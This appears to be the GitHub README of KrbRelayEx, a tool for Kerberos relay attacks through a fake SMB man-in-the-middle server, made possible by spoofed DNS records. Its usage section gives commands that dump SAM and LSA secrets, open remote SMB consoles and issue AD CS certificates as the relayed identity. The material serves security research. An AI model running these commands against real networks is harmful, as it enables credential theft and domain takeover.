# KrbRelayEx

![Version](https://img.shields.io/badge/version-1.0-blue)  
Kerberos Relay and Forwarder for (Fake) SMB MiTM Server  
Created by [@decoder_it](https://github.com/decoder-it)

---

## Why this tool
I created this tool to explore and understand the offensive capabilities of DNSAdmins  group in Active Directory who can modify DNS records. While they are considered privileged users, there has been a lack of detailed explanations (apart CVE-2021-40469) on how this privilege could be abused.
It's important to note that manipulating DNS entries is not limited to DNS Admins. There are other scenarios where this might be possible, such as having DNS Zones with insecure updates enabled (yes, this is not that uncommon!!) or gaining control over HOSTS file entries on client computers.<br>
My goal was to test whether a Man-in-the-Middle (MitM) attack involving forwarding and Kerberos relaying could be successfully executed and abused after creating a spoofed DNS entry.
During my investigation, I discovered an existing tool, [krbjack](https://github.com/almandin/krbjack), which performs a similar attack by exploiting the *Insecure DNS Updates* flag. However, it was somewhat limited in scope.<br>
I developed this tool, starting from  [KrbRelay](https://github.com/cube0x0/KrbRelay), using .NET 8.0, making it compatible with both Windows and GNU/Linux platforms.
## Overview

**KrbRelayEx** is a tool designed for performing Man-in-the-Middle (MitM) attacks by relaying Kerberos AP-REQ tickets. It listens for incoming SMB connections and forwards the AP-REQ to the target host, enabling access to SMB shares or HTTP AD CS (Active Directory Certificate Services) endpoints on behalf the targeted identity.  

The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired share.  

GitHub Repository: [https://github.com/decoder-it/KrbRelayEx](https://github.com/decoder-it/KrbRelayEx)  


---

## Features

- Relay Kerberos AP-REQ tickets to access SMB shares or HTTP ADCS endpoints.
- Interactive or background multithreaded SMB consoles for managing multiple connections, enabling file manipulation and creating/starting services
- Multithreaded port forwarding to support other protocols.
- Transparent relaying process for seamless user access.
- Runs on Winodws and GNU/Linux with .NET 8.0 sdk

## Notes

  - KrbRelayEx intercepts and relays the first authentication attempt,
    then switches to forwarder mode for all subsequent incoming requests.
    You can press any time 'r' for restarting relay mode

  - This tool is particularly effective if you can manipulate DNS names. Examples include:
    - Being a member of the DNS Admins group.
    - Having zones where unsecured DNS updates are allowed in Active Directory domains ==> This means that anonymous users with network access could potentially take over the domain!!!
    - Gaining control over HOSTS file entries on client computers.
  - Background consoles are ideal for managing multiple SMB consoles
  
## Usage

```
        #############      KrbRelayEx by @decoder_it     ##############
        # Kerberos Relay and Forwarder for (Fake) SMB MiTM Server     #
        # v1.0 2024                                                   #
        # Github: https://github.com/decoder-it/KrbRelayEx            #
        ###############################################################

Description:
  KrbRelayEx is a tool designed for performing Man-in-the-Middle (MitM) attacks and relaying Kerberos AP-REQ tickets.
  It listens for incoming SMB connections and forward the AP-REQ to the target host, enabling access to SMB shares or HTTP ADCS (Active Directory Certificate Services endpoints)
  The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired share.

Usage:
  KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]

SMB Attacks:
  -console                       Start an interactive SMB console
  -bgconsole                     Start an interactive SMB console in background via sockets
  -list                          List available SMB shares on the target system
  -bgconsolestartport            Specify the starting port for background SMB console sockets (default: 10000)
  -secrets                       Dump SAM & LSA secrets from the target system

HTTP Attacks:
  -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., 'CertSrv')
  -adcs <TEMPLATE>               Generate a certificate using the specified template

Options:
  -redirectserver <IP>           Specify the IP address of the target server for the attack
  -ssl                           Use SSL transport for secure communication
  -spn <SPN>                     Set the Service Principal Name (SPN) for the target service
  -redirectports <PORTS>         Provide a comma-separated list of additional ports to forward to the target (e.g., '3389,135,5985')
  -smbport <PORT>                Specify the SMB port to listen on (default: 445)

Examples:
  Start an interactive SMB console:
    KrbRelay.exe -spn CIFS/target.domain.com -console -redirecthost <ip_target_host>

  List SMB shares on a target:
    KrbRelay.exe -spn SMB/target.domain.com -list

  Dump SAM & LSA secrets:
    KrbRelay.exe -spn CIFS/target.domain.com -secrets -redirecthost <ip_target_host>

  Start a background SMB console on port 10000 upon relay:
    KrbRelay.exe -spn CIFS/target.domain.com -bgconsole -redirecthost <ip_target_host>

  Generate a certificate using ADCS with a specific template:
    KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>

  Relay attacks with SSL and port forwarding:
    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver  <ip_target_host> -redirectports 3389,5985,135,443,80
```
# Acknowledgements
Project Zero :

https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html

KrbRelay:


https://github.com/cube0x0/KrbRelay
